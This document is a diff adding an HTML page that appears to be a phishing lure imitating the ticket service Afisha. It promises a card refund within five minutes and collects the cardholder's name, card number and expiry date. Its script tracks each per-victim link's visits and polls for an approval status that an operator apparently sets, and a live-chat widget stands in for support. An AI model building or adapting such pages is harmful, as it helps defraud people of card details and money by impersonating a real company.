@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="format-detection" content="telephone=no">
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <title>Возврат средств - Афиша</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: 'Inter', sans-serif; 
+      background: #f8f9fa;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    
+    .refund-container {
+      background: white;
+      border-radius: 16px;
+      padding: 40px;
+      max-width: 480px;
+      width: 100%;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+      border: 1px solid #e8e8e8;
+    }
+    
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo-text {
+      font-size: 28px;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: 1px;
+    }
+    .logo-text span {
+      color: #e53935;
+    }
+    
+    .refund-header {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .refund-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+    .refund-amount {
+      font-size: 32px;
+      font-weight: 700;
+      color: #2e7d32;
+    }
+    .refund-amount span {
+      font-size: 18px;
+      color: #666;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+      font-weight: 500;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      background: #fafafa;
+    }
+    .form-group input:focus {
+      outline: none;
+      border-color: #1a1a1a;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(0,0,0,0.05);
+    }
+    .form-group input::placeholder {
+      color: #999;
+    }
+    
+    .form-row {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 12px;
+    }
+    
+    .submit-btn {
+      width: 100%;
+      background: #1a1a1a;
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 24px;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .submit-btn:hover {
+      background: #333;
+    }
+    .submit-btn:active {
+      transform: scale(0.98);
+    }
+    .submit-btn:disabled {
+      background: #999;
+      cursor: not-allowed;
+      transform: none;
+    }
+    
+    .loading-message {
+      display: none;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .loading-spinner {
+      width: 48px;
+      height: 48px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #1a1a1a;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 24px;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .loading-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+    }
+    .loading-text {
+      font-size: 14px;
+      color: #666;
+    }
+    
+    .success-message {
+      display: none;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .success-icon {
+      width: 64px;
+      height: 64px;
+      background: #e8f5e9;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+    .success-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+    .success-text {
+      font-size: 15px;
+      color: #666;
+      line-height: 1.6;
+    }
+    
+    .error-message {
+      display: none;
+      text-align: center;
+      padding: 50px 20px;
+    }
+    .error-icon {
+      width: 64px;
+      height: 64px;
+      background: #ffebee;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 32px;
+    }
+    .error-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #c62828;
+      margin-bottom: 12px;
+    }
+    .error-text {
+      font-size: 15px;
+      color: #666;
+      line-height: 1.6;
+    }
+    
+    .refund-info {
+      background: #f5f7f9;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 24px;
+      border-left: 3px solid #2e7d32;
+    }
+    .refund-info-text {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.5;
+    }
+    
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-top: 24px;
+      color: #888;
+      font-size: 12px;
+    }
+    .security-badge svg {
+      width: 14px;
+      height: 14px;
+    }
+    
+    .bank-logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 16px;
+      opacity: 0.6;
+    }
+    .bank-logo {
+      height: 20px;
+      width: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="refund-container">
+    <div class="logo">
+      <div class="logo-text"><span>a</span>fisha</div>
+    </div>
+    
+    <div id="refundForm">
+      <div class="refund-header">
+        <div class="refund-title">Возврат средств</div>
+        <div class="refund-amount" id="amountDisplay">0 <span>руб.</span></div>
+      </div>
+      
+      <div class="refund-info">
+        <div class="refund-info-text">
+          Возврат средств осуществляется в течение 5 минут на указанную банковскую карту после подтверждения заявки.
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label>ФИО владельца карты</label>
+        <input type="text" id="customerName" placeholder="Иванов Иван Иванович" required>
+      </div>
+      
+      <div class="form-row">
+        <div class="form-group">
+          <label>Номер банковской карты</label>
+          <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        </div>
+        <div class="form-group">
+          <label>Дата на карте</label>
+          <input type="text" id="cardExpiry" placeholder="ММ/ГГ" maxlength="5" required>
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label>Примечание</label>
+        <input type="text" id="refundNote" placeholder="Возврат">
+      </div>
+      
+      <button class="submit-btn" id="submitBtn" onclick="submitRefund()">Запросить возврат средств</button>
+      
+      <div class="security-badge">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+        Защищённое соединение SSL
+      </div>
+    </div>
+    
+    <div class="loading-message" id="loadingMessage">
+      <div class="loading-spinner"></div>
+      <div class="loading-title">Обработка заявки</div>
+      <div class="loading-text">Пожалуйста, подождите. Не закрывайте страницу.</div>
+    </div>
+    
+    <div class="success-message" id="successMessage">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Заявка принята</div>
+      <div class="success-text">
+        Средства поступят на карту в течение 5 минут.
+      </div>
+    </div>
+    
+    <div class="error-message" id="errorMessage">
+      <div class="error-icon">!</div>
+      <div class="error-title" id="errorTitle">Ссылка недействительна</div>
+      <div class="error-text" id="errorText">
+        Эта ссылка для возврата средств недействительна или уже была использована.
+      </div>
+    </div>
+  </div>
+  
+  <script>
+    let refundData = null;
+    let pollInterval = null;
+    
+    function formatCardNumber(input) {
+      let value = input.value.replace(/\D/g, '');
+      let formatted = '';
+      for (let i = 0; i < value.length && i < 16; i++) {
+        if (i > 0 && i % 4 === 0) formatted += ' ';
+        formatted += value[i];
+      }
+      input.value = formatted;
+    }
+    
+    function formatCardExpiry(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      input.value = value;
+    }
+    
+    document.getElementById('cardNumber').addEventListener('input', function() {
+      formatCardNumber(this);
+    });
+    
+    document.getElementById('cardExpiry').addEventListener('input', function() {
+      formatCardExpiry(this);
+    });
+    
+    async function loadRefundData() {
+      const path = window.location.pathname;
+      const code = path.split('/').pop();
+      
+      if (!code) {
+        showError('Неверная ссылка', 'Ссылка недействительна');
+        return;
+      }
+      
+      try {
+        const response = await fetch(`/api/refund/${code}`);
+        const data = await response.json();
+        
+        if (!response.ok || data.error) {
+          showError('Ссылка недействительна', data.error || 'Ссылка недействительна');
+          return;
+        }
+        
+        if (!data.is_active) {
+          showError('Ссылка недействительна', 'Эта ссылка для возврата была деактивирована');
+          return;
+        }
+        
+        if (data.status === 'approved') {
+          showSuccess();
+          return;
+        }
+        
+        if (data.status === 'rejected') {
+          showRejected();
+          return;
+        }
+        
+        if (data.status === 'submitted') {
+          refundData = data;
+          showLoading();
+          startPolling(code);
+          return;
+        }
+        
+        refundData = data;
+        document.getElementById('amountDisplay').innerHTML = `${data.amount.toLocaleString('ru-RU')} <span>руб.</span>`;
+        
+        fetch(`/api/refund/${code}/visit`, { method: 'POST' });
+        
+      } catch (error) {
+        console.error('Error loading refund data:', error);
+        showError('Ошибка', 'Ошибка загрузки данных');
+      }
+    }
+    
+    function showError(title, message) {
+      document.getElementById('refundForm').style.display = 'none';
+      document.getElementById('loadingMessage').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('errorMessage').style.display = 'block';
+      document.getElementById('errorTitle').textContent = title;
+      document.getElementById('errorText').textContent = message;
+    }
+    
+    function showSuccess() {
+      document.getElementById('refundForm').style.display = 'none';
+      document.getElementById('loadingMessage').style.display = 'none';
+      document.getElementById('errorMessage').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'block';
+    }
+    
+    function showRejected() {
+      document.getElementById('refundForm').style.display = 'none';
+      document.getElementById('loadingMessage').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('errorMessage').style.display = 'block';
+      document.getElementById('errorTitle').textContent = 'Ошибка';
+      document.getElementById('errorText').textContent = 'Произошла ошибка, обратитесь в тех. поддержку';
+    }
+    
+    function showLoading() {
+      document.getElementById('refundForm').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('errorMessage').style.display = 'none';
+      document.getElementById('loadingMessage').style.display = 'block';
+    }
+    
+    function startPolling(code) {
+      pollInterval = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/refund/${code}/status`);
+          const data = await response.json();
+          
+          if (data.status === 'approved') {
+            clearInterval(pollInterval);
+            showSuccess();
+          } else if (data.status === 'rejected') {
+            clearInterval(pollInterval);
+            showRejected();
+          }
+        } catch (error) {
+          console.error('Polling error:', error);
+        }
+      }, 2000);
+    }
+    
+    async function submitRefund() {
+      const customerName = document.getElementById('customerName').value.trim();
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      const cardExpiry = document.getElementById('cardExpiry').value.trim();
+      const refundNote = document.getElementById('refundNote').value.trim() || 'Возврат';
+      
+      if (!customerName) {
+        alert('Пожалуйста, укажите ФИО');
+        return;
+      }
+      
+      if (cardNumber.length !== 16) {
+        alert('Пожалуйста, введите корректный номер карты (16 цифр)');
+        return;
+      }
+      
+      if (!cardExpiry || cardExpiry.length < 5) {
+        alert('Пожалуйста, укажите срок действия карты (ММ/ГГ)');
+        return;
+      }
+      
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true;
+      btn.textContent = 'Отправка...';
+      
+      try {
+        const response = await fetch(`/api/refund/${refundData.refund_code}/submit`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            customer_name: customerName,
+            card_number: cardNumber.slice(-4),
+            card_expiry: cardExpiry,
+            refund_note: refundNote
+          })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+          showLoading();
+          startPolling(refundData.refund_code);
+        } else {
+          alert(result.message || 'Ошибка отправки заявки');
+          btn.disabled = false;
+          btn.textContent = 'Запросить возврат средств';
+        }
+      } catch (error) {
+        console.error('Error submitting refund:', error);
+        alert('Ошибка отправки заявки');
+        btn.disabled = false;
+        btn.textContent = 'Запросить возврат средств';
+      }
+    }
+    
+    loadRefundData();
+  </script>
+<script src="//code.tidio.co/ufjldpy2fgwbem1lrdwd8yqubddfk15k.js" async></script>
+</body>
+</html>
